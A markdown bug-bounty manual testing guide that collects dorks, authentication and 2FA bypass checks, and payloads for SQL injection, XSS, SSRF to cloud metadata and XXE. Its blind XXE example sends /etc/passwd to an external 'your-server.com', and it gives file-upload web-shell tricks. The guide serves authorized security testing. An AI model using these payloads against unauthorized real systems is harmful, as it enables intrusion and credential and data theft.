# Manual Testing Guide

> When automated tools can't go further, this is where you find the real bugs.
> Nuclei and scanners catch the obvious — manual testing catches the bounty-worthy.

---

## 1. Recon That Tools Miss

### Google Dorking
```
site:target.com ext:php inurl:admin
site:target.com ext:sql | ext:env | ext:log | ext:bak
site:target.com "Index of /"
site:target.com intext:"password" filetype:txt
site:target.com inurl:api/v1
"@target.com" filetype:xls | filetype:csv
site:trello.com "target.com"
site:pastebin.com "target.com"
```

### GitHub Dorking
```
org:targetorg password
org:targetorg secret
org:targetorg api_key
filename:.env "target.com"
filename:config.yml "target.com"
# Tool: https://github.com/d1vanov/cicd-test
```

### Subdomain Discovery When Tools Fail
```bash
# Zone transfer attempt (often blocked, sometimes not)
dig axfr target.com @ns1.target.com

# DNSSEC walking
ldns-walk target.com

# ASN → IP ranges → reverse DNS
# 1. Find ASN: curl https://api.bgpview.io/search?query=Target+Company
# 2. Get IP ranges from ASN
# 3. Reverse DNS all IPs:
for ip in $(seq 1 254); do host 1.2.3.$ip 2>/dev/null | grep "domain name" ; done

# VHost brute force (same IP, different virtual hosts)
ffuf -u https://TARGET_IP -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200,301,302

# Permutation-based discovery
# Install: go install github.com/d3mondev/puredns/v2@latest
cat subdomains.txt | sed 's/\.target\.com//' > names.txt
# Generate permutations: dev-names, names-dev, names-staging, etc.
```

---

## 2. Authentication Testing

### Password Reset Flow
```
1. Request password reset for victim@target.com
2. Check if reset token is:
   - Predictable (sequential, time-based, short)
   - Never expires
   - Works multiple times
3. Try Host header injection:
   POST /forgot-password
   Host: evil.com          ← reset link goes to evil.com

4. Check if token in URL (Referer leakage):
   After clicking reset link, go to external resource on the page
   Check Referer header — may contain token

5. Response manipulation: if "invalid token" → change response to 200 OK
```

### 2FA Bypass Checklist
```
1. Try old session after enabling 2FA (session not invalidated?)
2. Direct navigation: login → get OTP page URL → skip to /dashboard
3. Modify response: {"verified": false} → {"verified": true}
4. OTP brute force: is there rate limiting on OTP attempts?
5. OTP reuse: does same OTP work twice?
6. Skip endpoint: POST /api/verify-2fa with empty body
7. Backup codes: are they single-use? Are they predictable?
```

### OAuth / SSO Testing
```
1. State parameter missing or not validated → CSRF login
   Attacker initiates OAuth → copies URL → victim clicks → attacker's account linked

2. Redirect URI not strictly validated:
   redirect_uri=https://target.com.evil.com  ← subdomain
   redirect_uri=https://target.com/callback?next=https://evil.com
   redirect_uri=https://target.com/../../evil.com

3. Token leakage in Referer:
   Access token in URL → page has external images → token in Referer header

4. JWT algorithm confusion:
   Change "alg": "RS256" to "alg": "HS256" → sign with public key as HMAC secret

5. JWT none algorithm:
   Change "alg": "RS256" to "alg": "none" → empty signature
```

---

## 3. IDOR & Access Control

### Systematic IDOR Testing
```
1. Create two accounts: account_a and account_b
2. With account_a, perform every action and capture all object IDs
3. With account_b, try to access/modify account_a's resources

# Common ID locations:
GET /api/invoices/1337           ← URL path
GET /api/invoices?id=1337        ← query param
{"invoice_id": "1337"}          ← JSON body
Cookie: user_id=1337             ← cookie
X-User-ID: 1337                  ← custom header

# ID types to test:
- Integer: 1, 2, 3 (increment/decrement)
- UUID: if sequential (UUIDv1), can predict nearby
- Hash: try other users' known object hashes
```

### Horizontal vs Vertical Privilege Escalation
```bash
# Horizontal: access another user's same-level data
# → Same role, different user ID

# Vertical: access higher-privilege functionality
# → Regular user accessing admin endpoint

# Test every admin endpoint with a regular user session:
ffuf -u https://target.com/admin/FUZZ -w common.txt \
     -H "Cookie: session=REGULAR_USER_SESSION" \
     -mc 200,302 -fc 403

# Mass assignment: add privileged fields to API request
# Normal request:
{"name": "John", "email": "john@example.com"}
# Try:
{"name": "John", "email": "john@example.com", "role": "admin", "is_admin": true}
```

---

## 4. Injection Testing

### SQL Injection — Manual Payloads
```sql
-- Basic detection (trigger error or delay):
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
1' AND SLEEP(5)--    ← time-based blind
1' AND 1=2--         ← boolean-based blind

-- Union-based (find column count first):
' ORDER BY 1--
' ORDER BY 2--   (increment until error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- MySQL info extraction:
' UNION SELECT user(),version(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

### XSS — When Simple Payloads Are Filtered
```html
<!-- Basic -->
<script>alert(1)</script>

<!-- Filter bypasses -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
javascript:alert(1)                    ← href/src attributes

<!-- Case/encoding bypasses -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert&#40;1&#41;</script>
%3Cscript%3Ealert(1)%3C/script%3E

<!-- CSP bypasses -->
<!-- Find JSONP endpoints on same origin or CDN whitelist -->
<script src="https://whitelisted-cdn.com/jsonp?callback=alert(1)"></script>

<!-- DOM XSS sources to check manually: -->
document.location, document.URL, document.referrer
window.name, document.cookie
location.hash, location.search
```

### SSRF — Probing Internal Networks
```
# Cloud metadata endpoints (try all — AWS, GCP, Azure):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/       ← often has creds
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal network discovery:
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://127.0.0.1:8080/
http://192.168.1.1/         ← router

# Protocol wrappers:
file:///etc/passwd
dict://127.0.0.1:11211/     ← Memcached
gopher://127.0.0.1:6379/_KEYS  ← Redis

# Bypass filters:
http://2130706433/          ← 127.0.0.1 in decimal
http://0x7f000001/          ← 127.0.0.1 in hex
http://127.0.0.1.evil.com/  ← DNS rebinding domain
http://[::1]/               ← IPv6 localhost
```

### XXE
```xml
<!-- Classic -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://internal-server/">
]>

<!-- Blind (out-of-band) -->
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "https://your-server.com/evil.dtd">
  %ext;
]>
<!-- evil.dtd: -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://your-server.com/?x=%data;'>">
%param1;
```

---

## 5. Business Logic Flaws

### E-commerce / Pricing
```
1. Negative quantities: add -1 items to cart
2. Price manipulation: intercept request, change price field
3. Coupon abuse: apply same coupon multiple times (race condition)
4. Integer overflow: order quantity 9999999999
5. Currency manipulation: change USD to a lower-value currency in request
```

### Race Conditions
```bash
# Send N simultaneous requests (Burp Repeater → "Send group in parallel")
# Or with turbo intruder / ffuf:

# Test: can a $10 gift card be redeemed multiple times with parallel requests?
# Test: does balance transfer check run twice before deducting?
# Test: free trial activated twice with parallel requests?

# CLI test:
for i in {1..20}; do
  curl -s -X POST https://target.com/api/redeem \
       -H "Cookie: session=YOURS" \
       -d '{"code":"GIFT10"}' &
done
wait
```

### File Upload Bypass
```
1. Change Content-Type: image/jpeg for a PHP file
2. Double extension: shell.php.jpg (server strips last extension)
3. Null byte: shell.php%00.jpg
4. Case: shell.PHP, shell.pHp
5. Less common extensions: .phtml, .php5, .shtml
6. SVG with JavaScript: <svg xmlns="..."><script>alert(1)</script></svg>
7. Upload ZIP containing symlink → path traversal after unzip
8. If converted to image: try ImageMagick exploits (ImageTragick)
```

---

## 6. API Testing

### Common API Issues
```bash
# Find all API endpoints:
katana -u https://target.com -jc -silent | grep -i "/api/"
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt

# HTTP method tampering:
# Change GET → POST, PUT, DELETE, PATCH on every endpoint
curl -X DELETE https://target.com/api/user/1 -H "Cookie: session=YOURS"

# API versioning — old versions often lack security:
/api/v1/user    ← test this if current is /api/v3/user
/api/user       ← even older

# GraphQL (if detected):
# Introspection query:
{"query": "{__schema{types{name,fields{name}}}}"}
# Batching attack (bypass rate limiting):
[{"query": "mutation{login(email:\"a\",pass:\"1\")}"}, ... x100 ...]

# Check for exposed swagger/docs:
/swagger-ui.html, /api-docs, /openapi.json, /v2/api-docs
```

---

## 7. Headers & Config Checks

### Security Header Audit
```bash
curl -sI https://target.com | grep -iE \
  "(strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy)"

# Missing headers = informational findings (some programs pay for these):
# Strict-Transport-Security
# Content-Security-Policy
# X-Frame-Options (clickjacking)
# X-Content-Type-Options: nosniff
```

### CORS Manual Test
```bash
# Test 1: arbitrary origin reflected
curl -s -I https://target.com/api/user \
     -H "Origin: https://evil.com" \
     -H "Cookie: session=YOURS" \
  | grep -i "access-control"

# Dangerous: if response has:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → An attacker's site can read authenticated API responses

# Test 2: null origin
curl -s -I https://target.com/api/user \
     -H "Origin: null" \
     -H "Cookie: session=YOURS"

# Test 3: subdomain (might trust *.target.com):
-H "Origin: https://evil.target.com"
```

---

## 8. Evidence Collection (for reports)

### Burp Suite essentials
```
1. Proxy → HTTP history: Right-click → Copy as curl command
2. Repeater: modify and replay requests
3. Comparer: diff two responses to spot subtle differences
4. Intruder: fuzzing / brute force
5. Save request/response: right-click → Save item
6. Screenshot every step of PoC
```

### Minimal PoC for every finding
```
For every bug report, capture:
1. Request (raw HTTP headers + body)
2. Response (raw with status + body showing impact)
3. Screenshot of the impact (account takeover, data exfil, etc.)
4. Exact reproduction steps (can a developer reproduce this in <5 min?)
5. Impact statement: what can an attacker do with this?
```

---

## 9. Quick Reference Commands

```bash
# Start an HTTP server to catch out-of-band interactions:
python3 -m http.server 8888

# URL-encode a payload:
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"

# Base64 encode:
echo -n 'payload' | base64

# Check if endpoint exists:
curl -sI https://target.com/admin | head -1

# Follow redirects verbosely:
curl -sIL https://target.com/admin

# Extract URLs from JS file:
curl -s https://target.com/app.js | grep -oE '(["'"'"'])/[a-zA-Z0-9/_-]+' | sort -u

# Find subdomains in JS:
curl -s https://target.com/app.js | grep -oE '[a-zA-Z0-9.-]+\.target\.com' | sort -u

# Check for open redirect:
curl -sIL "https://target.com/login?next=https://evil.com" | grep -i location

# Test rate limiting (10 rapid requests):
for i in {1..10}; do curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target.com/api/login -d 'user=a&pass=b'; done
```
